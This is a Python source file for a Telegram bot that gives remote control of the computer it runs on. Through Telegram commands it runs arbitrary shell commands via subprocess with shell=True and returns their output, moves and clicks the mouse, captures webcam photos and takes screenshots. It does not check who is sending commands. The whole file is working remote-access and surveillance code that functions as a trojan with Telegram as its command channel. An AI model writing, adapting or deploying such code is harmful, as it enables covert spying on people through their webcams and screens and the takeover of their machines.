from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from typing import Dict
import socket
import subprocess
import pyautogui
import cv2
import tempfile
import os

# Your bot token
TOKEN = 'place yout tokken here'

# Dictionary to keep track of active clients
active_clients: Dict[str, str] = {}  # {user_id: device_name}

# Function to get the device name (hostname)
def get_device_name() -> str:
    return socket.gethostname()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Welcome! Use /clients to see active devices.")

async def clients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not active_clients:
        await update.message.reply_text("No active clients.")
        return
    
    message = "Active clients:\n" + "\n".join(f"{device}: {user_id}" for user_id, device in active_clients.items())
    await update.message.reply_text(message)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.text.startswith('/register'):
        user_id = str(update.effective_user.id)
        device_name = ' '.join(update.message.text.split()[1:]) if len(update.message.text.split()) > 1 else 'Unknown Device'
        active_clients[user_id] = device_name
        await update.message.reply_text(f"Device registered as {device_name}")
    elif update.message.text.startswith('/exec'):
        # The command execution will be handled separately
        pass
    elif update.message.text.startswith('/photo'):
        await take_photo(update, context)
    elif update.message.text.startswith('/screenshot'):
        await take_screenshot(update, context)
    else:
        await update.message.reply_text("Unknown command. Use /clients to see active devices.")

async def exec_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) == 0:
        await update.message.reply_text("Please provide a command to execute.")
        return
    
    command = ' '.join(context.args)
    
    try:
        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        # Send the command output back to the user
        if result.stdout:
            await update.message.reply_text(f"Output:\n{result.stdout}")
        if result.stderr:
            await update.message.reply_text(f"Error:\n{result.stderr}")
    
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {str(e)}")

async def mouse_control(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("Move Left", callback_data='move_left')],
        [InlineKeyboardButton("Move Right", callback_data='move_right')],
        [InlineKeyboardButton("Move Up", callback_data='move_up')],
        [InlineKeyboardButton("Move Down", callback_data='move_down')],
        [InlineKeyboardButton("Click", callback_data='click')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Choose an action:", reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    data = query.data
    
    # Acknowledge the callback query
    await query.answer()
    
    # Perform the action based on the callback data
    if data == 'move_left':
        pyautogui.move(-100, 0)
      
    elif data == 'move_right':
        pyautogui.move(100, 0)
       
    elif data == 'move_up':
        pyautogui.move(0, -100)
   
    elif data == 'move_down':
        pyautogui.move(0, 100)
 
    elif data == 'click':
        pyautogui.click()
   
    else:
        await query.message.reply_text("Unknown action.")

async def take_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        await update.message.reply_text("Failed to open webcam.")
        return
    
    # Capture a single frame
    ret, frame = cap.read()
    cap.release()
    
    if not ret:
        await update.message.reply_text("Failed to capture image.")
        return
    
    # Create a temporary file to save the image
    with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
        temp_file_path = temp_file.name
    
    # Save the frame to the temporary file
    cv2.imwrite(temp_file_path, frame)
    
    # Send the photo to the Telegram chat
    await update.message.reply_photo(photo=open(temp_file_path, 'rb'))
    
    # Remove the temporary file
    os.remove(temp_file_path)

async def take_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Capture the screenshot
    screenshot = pyautogui.screenshot()
    
    # Create a temporary file to save the screenshot
    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
        temp_file_path = temp_file.name
    
    # Save the screenshot to the temporary file
    screenshot.save(temp_file_path)
    
    # Send the screenshot to the Telegram chat
    await update.message.reply_photo(photo=open(temp_file_path, 'rb'))
    
    # Remove the temporary file
    os.remove(temp_file_path)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "Here are the available commands:\n"
        "/start - Welcome message\n"
        "/clients - List active clients\n"
        "/register <device_name> - Register a device\n"
        "/exec <command> - Execute a shell command\n"
        "/mouse - Control the mouse\n"
        "/photo - Take a photo using the webcam\n"
        "/screenshot - Take a screenshot\n"
        "/help - Show this help message"
    )
    await update.message.reply_text(help_text)

def register_bot_device() -> None:
    bot_device_name = get_device_name()
    active_clients['bot'] = bot_device_name

def main() -> None:
    register_bot_device()

    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("clients", clients))
    application.add_handler(CommandHandler("exec", exec_command))
    application.add_handler(CommandHandler("mouse", mouse_control))  # Add handler for /mouse command
    application.add_handler(CommandHandler("photo", take_photo))  # Add handler for /photo command
    application.add_handler(CommandHandler("screenshot", take_screenshot))  # Add handler for /screenshot command
    application.add_handler(CommandHandler("help", help_command))  # Add handler for /help command
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))  # Handle button presses

    application.run_polling()

if __name__ == '__main__':
    main()
